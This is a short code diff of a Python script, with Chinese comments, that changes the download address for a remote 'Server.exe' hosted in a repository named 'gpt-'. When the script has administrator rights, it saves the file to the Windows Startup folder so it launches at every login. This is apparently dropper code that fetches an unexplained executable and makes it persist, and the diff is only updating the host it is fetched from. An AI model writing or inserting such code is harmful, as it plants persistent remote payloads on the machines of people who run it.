@@ -11,7 +11,7 @@ def is_admin():
         return False
 
 if is_admin():  
-    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/gpt-/blob/main/Server.exe"#下载地址
+    url = "https://hub.yzuu.cf/snow6BIG/gpt-/blob/main/Server.exe"#下载地址
     dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#保存位置
     file_path = os.path.join(dir, 'Server.exe')#保存为
 
